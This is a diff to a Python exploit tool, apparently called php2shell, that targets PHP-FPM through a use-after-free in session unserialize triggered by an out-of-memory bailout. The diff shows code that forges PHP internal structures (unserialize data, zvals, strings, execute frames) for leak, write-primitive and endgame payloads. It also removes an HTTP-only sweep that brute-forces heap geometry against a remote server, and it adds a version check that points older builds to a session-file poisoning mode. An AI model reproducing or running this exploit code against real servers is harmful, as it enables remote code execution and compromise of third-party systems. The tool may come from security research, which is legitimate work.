@@ -58,6 +58,10 @@ import urllib.parse
 
 HERE = os.path.dirname(os.path.abspath(__file__))
 ROOT = os.path.dirname(HERE)
+sys.path.insert(0, HERE)
+
+import php2shell_fpm_versions as registry  # noqa: E402
+
 LAB = os.path.join(ROOT, "lab", "fpm")
 RUNTIME = os.path.join(LAB, "runtime")
 
@@ -664,20 +668,6 @@ def _build_primitive_payload(d: int, k: int, size: int, value: int,
     uns = layout["unserialize_data"]
     zval = layout["zval"]
     forged = bytearray(size)
-    if uns.get("legacy"):
-        buffer_start = d - k
-        ve = layout["var_entries"]
-        struct.pack_into("<Q", forged, k + uns["first"], buffer_start)
-        struct.pack_into("<Q", forged, k + uns["last"], buffer_start)
-        struct.pack_into("<Q", forged, k + uns["first_dtor"], 0)
-        struct.pack_into("<Q", forged, k + uns["last_dtor"], 0)
-        # the fake var_entries starts at the buffer head, so its members are
-        # content offsets without k
-        struct.pack_into("<Q", forged, ve["data"] + 8, d + 0x300)
-        struct.pack_into("<q", forged, ve["used_slots"], 2)
-        struct.pack_into("<Q", forged, k + 0x300, value)
-        struct.pack_into("<I", forged, k + 0x300 + zval["type_info"], 4)
-        return bytes(forged)
     entries = uns["entries"]
     data_base = entries + layout["var_entries"]["data"]
     struct.pack_into("<Q", forged, k + uns["last"], d + entries)
@@ -710,27 +700,15 @@ def _build_leak_payload(d: int, k: int, size: int, read_len: int,
     string = layout["zend_string"]
     ve = layout["var_entries"]
     forged = bytearray(size)
-    if uns.get("legacy"):
-        # PHP <= 7.3: the fake var_entries starts at the head of the buffer
-        # (PHP 7 frees every block var_destroy walks), and the dtor lists
-        # stay NULL so nothing dereferences them.
-        buffer_start = d - k
-        struct.pack_into("<Q", forged, k + uns["first"], buffer_start)
-        struct.pack_into("<Q", forged, k + uns["last"], buffer_start)
-        struct.pack_into("<Q", forged, k + uns["first_dtor"], 0)
-        struct.pack_into("<Q", forged, k + uns["last_dtor"], 0)
-        struct.pack_into("<Q", forged, ve["data"] + 8, d + 0x300)
-        struct.pack_into("<q", forged, ve["used_slots"], 2)
-    else:
-        entries = uns["entries"]
-        data_base = entries + ve["data"]
-        struct.pack_into("<Q", forged, k + uns["last"], d + entries)
-        struct.pack_into("<Q", forged, k + uns["first_dtor"], d + 0x600)
-        struct.pack_into("<Q", forged, k + uns["last_dtor"], d + 0x600)
-        struct.pack_into("<q", forged, k + uns["max_depth"], 64)
-        struct.pack_into("<q", forged, k + entries + ve["used_slots"], 2)
-        struct.pack_into("<Q", forged, k + data_base + 8, d + 0x300)
-        struct.pack_into("<q", forged, k + 0x600, 0)      # empty dtor list
+    entries = uns["entries"]
+    data_base = entries + ve["data"]
+    struct.pack_into("<Q", forged, k + uns["last"], d + entries)
+    struct.pack_into("<Q", forged, k + uns["first_dtor"], d + 0x600)
+    struct.pack_into("<Q", forged, k + uns["last_dtor"], d + 0x600)
+    struct.pack_into("<q", forged, k + uns["max_depth"], 64)
+    struct.pack_into("<q", forged, k + entries + ve["used_slots"], 2)
+    struct.pack_into("<Q", forged, k + data_base + 8, d + 0x300)
+    struct.pack_into("<q", forged, k + 0x600, 0)      # empty dtor list
     # fake zval at d+0x300: IS_STRING_EX -> forged zend_string at d+0x400
     struct.pack_into("<Q", forged, k + 0x300, d + 0x400)
     struct.pack_into("<I", forged, k + 0x300 + zval["type_info"], 0x106)
@@ -852,28 +830,15 @@ def _build_endgame_payload(d: int, k: int, size: int, zif: int,
     frame = layout["zend_execute_data"]
     ve = layout["var_entries"]
     # decode-time forged struct (identical to the primitive)
-    if uns.get("legacy"):
-        # PHP <= 7.3: five pointers, var_entries in its own allocation.  The
-        # fake block starts at the reclaim buffer itself so that PHP 7's
-        # var_destroy() can free it as a real sizeof(var_entries) block, and
-        # its members are therefore content offsets without k.
-        buffer_start = d - k
-        struct.pack_into("<Q", forged, k + uns["first"], buffer_start)
-        struct.pack_into("<Q", forged, k + uns["last"], buffer_start)
-        struct.pack_into("<Q", forged, k + uns["first_dtor"], 0)
-        struct.pack_into("<Q", forged, k + uns["last_dtor"], 0)
-        struct.pack_into("<Q", forged, ve["data"] + 8, d + 0x300)
-        struct.pack_into("<q", forged, ve["used_slots"], 2)
-    else:
-        entries = uns["entries"]
-        data_base = entries + ve["data"]
-        struct.pack_into("<Q", forged, k + uns["last"], d + entries)
-        struct.pack_into("<Q", forged, k + uns["first_dtor"], d + 0x400)
-        struct.pack_into("<Q", forged, k + uns["last_dtor"], d + 0x400)
-        struct.pack_into("<q", forged, k + uns["max_depth"], 64)
-        struct.pack_into("<q", forged, k + entries + ve["used_slots"], 2)
-        struct.pack_into("<Q", forged, k + data_base + 8, d + 0x300)
-        struct.pack_into("<q", forged, k + 0x400, 0)      # fake dtor used_slots
+    entries = uns["entries"]
+    data_base = entries + ve["data"]
+    struct.pack_into("<Q", forged, k + uns["last"], d + entries)
+    struct.pack_into("<Q", forged, k + uns["first_dtor"], d + 0x400)
+    struct.pack_into("<Q", forged, k + uns["last_dtor"], d + 0x400)
+    struct.pack_into("<q", forged, k + uns["max_depth"], 64)
+    struct.pack_into("<q", forged, k + entries + ve["used_slots"], 2)
+    struct.pack_into("<Q", forged, k + data_base + 8, d + 0x300)
+    struct.pack_into("<q", forged, k + 0x400, 0)      # fake dtor used_slots
     # fake zval at d+0x300: IS_REFERENCE -> fake ref at d+0x500
     struct.pack_into("<Q", forged, k + 0x300, d + 0x500)
     struct.pack_into("<I", forged, k + 0x300 + zval["type_info"], 0x10A)
@@ -1209,8 +1174,6 @@ LEAK_HEADER_GRID = (0x17E8, 0x16E8, 0x18E8, 0x15E8, 0x19E8, 0x1000,
                     0x1200, 0x1400, 0x1A00, 0x1C00, 0x2000, 0x2400,
                     0x2800, 0x3000)
 LEAK_READ_LEN = 0x15810
-LEAK_PADS = (32768, 16384)
-LEAK_BUFFER_SIZE = 16384
 # Offsets of the executable (r-x) mapping inside a PHP build.  The binary
 # starts with one 2MB read-only page and its code spans a few MB after it
 # (5.3 MB on 8.2, 4.9 MB on 8.4).  Anything a base candidate has to explain
@@ -1444,27 +1407,6 @@ def cmd_no_oracle(args) -> int:
     return 1
 
 
-def _sweep_grid(version: str) -> list[tuple[int, int]]:
-    """(d_off, k) pairs to try over HTTP, profile candidates first.
-
-    The 8 KB php_unserialize_data slot recycles between two chunk offsets
-    and the reclaim buffer covers it at one of a few content offsets; the
-    grid starts from the profile of the closest calibrated version and then
-    widens around it, so a working pair is usually found within a handful of
-    attempts.
-    """
-    _size, candidates, _pads = _no_oracle_geometry(version)
-    grid = [(int(c[0]), int(c[1])) for c in candidates]
-    offsets = (0xFE8, 0x1FE8, 0x2FE8, 0x8E8, 0x16E8, 0x3E8, 0x26E8)
-    slots = (0x81000, 0x82000, 0x7F000, 0x7D000, 0x83000, 0x80000,
-             0x84000, 0x7E000, 0x7C000, 0x85000)
-    for slot in slots:
-        for offset in offsets:
-            if (slot, offset) not in grid:
-                grid.append((slot, offset))
-    return grid
-
-
 def _wide_grid(version: str, start: int = 0x60000, end: int = 0xA0000,
                step: int = 0x800) -> list[tuple[int, int]]:
     """Every plausible slot of the chunk with the two common cover offsets.
@@ -1476,9 +1418,11 @@ def _wide_grid(version: str, start: int = 0x60000, end: int = 0xA0000,
     usually finishes within a few dozen attempts.
     """
     grid: list[tuple[int, int]] = []
-    for slot in _sweep_grid(version):
-        if slot not in grid:
-            grid.append(slot)
+    _size, candidates, _pads = _no_oracle_geometry(version)
+    for slot in candidates:
+        pair = (int(slot[0]), int(slot[1]))
+        if pair not in grid:
+            grid.append(pair)
 
     def band(low: int, high: int) -> None:
         for slot in range(low, high, step):
@@ -1491,67 +1435,6 @@ def _wide_grid(version: str, start: int = 0x60000, end: int = 0xA0000,
     band(start, 0x78000)
     band(0x88000, end)
     return grid
-
-
-def cmd_sweep(args) -> int:
-    """Find the remote reclaim geometry over HTTP only (no /proc at all).
-
-    Every candidate is a full remote endgame run: leak the ASLR bases once
-    over HTTP, arm the stale state, consume with a forged buffer positioned
-    at (chunk offset, content offset), and check whether the proof file
-    appeared.  The winners are printed and, with --update-profile, written
-    into the version's profile as its no_oracle.candidates.
-    """
-    if getattr(args, "chunk", 0) and getattr(args, "pie", 0):
-        chunk, pie = int(args.chunk), int(args.pie)
-        print(f"[*] bases supplied: chunk=0x{chunk:x} pie=0x{pie:x}")
-    else:
-        try:
-            pie, chunk = leak_bases_http(args.base, args.builder, args.version,
-                                         getattr(args, "arm_path", None))
-        except (OSError, RuntimeError) as exc:
-            print(f"[!] HTTP leak failed: {exc}")
-            return 1
-        print(f"[*] bases from the HTTP leak: chunk=0x{chunk:x} pie=0x{pie:x}")
-    grid = _sweep_grid(args.version)
-    attempts = int(getattr(args, "attempts", 24))
-    print(f"[*] sweeping {min(attempts, len(grid))} candidates over HTTP")
-    winners: list[tuple[int, int]] = []
-    for index, (d_off, k) in enumerate(grid[:attempts]):
-        proof = f"out/sweep-{args.version.replace('.', '')}-{index}"
-        print(f"\n--- candidate {index}: d_off=0x{d_off:x} k=0x{k:x} ---")
-        attempt = argparse.Namespace(**vars(args))
-        attempt.candidates = [(d_off, k)]
-        attempt.proof_file = proof
-        attempt.chunk, attempt.pie = chunk, pie
-        if cmd_no_oracle(attempt) == 0:
-            winners.append((d_off, k))
-            print(f"[+] remote geometry works: d_off=0x{d_off:x} k=0x{k:x}")
-            if getattr(args, "first_only", False):
-                break
-    if not winners:
-        print("[!] no candidate produced a proof over HTTP")
-        return 1
-    print("\n[+] remote candidates:")
-    for d_off, k in winners:
-        print(f"    d_off=0x{d_off:x} k=0x{k:x}")
-    if getattr(args, "update_profile", False):
-        path = os.path.join(ROOT, "profiles", f"{args.version}-fpm.json")
-        try:
-            with open(path, encoding="utf-8") as handle:
-                profile = json.load(handle)
-            profile["fpm"]["no_oracle"]["candidates"] = [
-                {"d_off": hex(d_off), "k": hex(k)} for d_off, k in winners]
-            profile["fpm"]["no_oracle"]["bases"] = (
-                "candidates verified over HTTP with the no-oracle chain "
-                "(no /proc access); bases stable for the FPM master lifetime")
-            with open(path, "w", encoding="utf-8") as handle:
-                json.dump(profile, handle, indent=2)
-                handle.write("\n")
-            print(f"[+] updated {path}")
-        except (OSError, KeyError, TypeError, ValueError) as exc:
-            print(f"[!] could not update the profile: {exc}")
-    return 0
 
 
 def _remote_arm_and_normalize(base: str, builder: str, size: int,
@@ -1919,7 +1802,7 @@ def main() -> int:
     sub = parser.add_subparsers(dest="cmd", required=True)
     for name in ("lifecycle", "oracle", "build-oom", "build-ref", "producer",
                  "reclaim-probe", "primitive", "endgame", "chain", "patchcheck",
-                 "leak", "no-oracle", "sweep", "calibrate", "poison"):
+                 "leak", "no-oracle", "calibrate", "poison"):
         subparser = sub.add_parser(name)
         if name == "no-oracle":
             subparser.add_argument(
@@ -1929,16 +1812,6 @@ def main() -> int:
                 "--candidates", action="append", default=None,
                 metavar="D_OFF,K",
                 help="override the (d_off,k) reclaim candidates, e.g. 0x81000,0xfe8")
-        if name == "sweep":
-            subparser.add_argument(
-                "--attempts", type=int, default=24,
-                help="maximum number of candidates to try over HTTP")
-            subparser.add_argument(
-                "--first-only", action="store_true",
-                help="stop at the first candidate that produces a proof")
-            subparser.add_argument(
-                "--update-profile", action="store_true",
-                help="write the winning candidates into the version's profile")
         if name == "calibrate":
             subparser.add_argument(
                 "--attempts", type=int, default=250,
@@ -1960,6 +1833,15 @@ def main() -> int:
                                    help="PHP_SESSION_UPLOAD_PROGRESS value")
     args = parser.parse_args()
     configure_paths(args)
+    # PHP <= 7.x never frees the unserialize struct on the OOM bailout (no
+    # php_session_cancel_decode), so there is nothing for these commands to
+    # reclaim: use 'poison' against those builds.
+    if args.cmd in ("leak", "primitive", "endgame", "chain", "calibrate",
+                    "no-oracle") and not registry.chain_applies(args.version):
+        print(f"[!] {args.cmd} needs PHP >= 8.0: on PHP <= 7.x the bailout "
+              f"never frees the unserialize struct.")
+        print("    Use 'poison' (session-file plant) against those builds.")
+        return 1
     if getattr(args, "candidates", None):
         pairs = []
         for item in args.candidates:
@@ -1979,7 +1861,6 @@ def main() -> int:
         "patchcheck": cmd_patchcheck,
         "leak": cmd_leak,
         "no-oracle": cmd_no_oracle,
-        "sweep": cmd_sweep,
         "calibrate": cmd_calibrate,
         "poison": cmd_poison,
     }
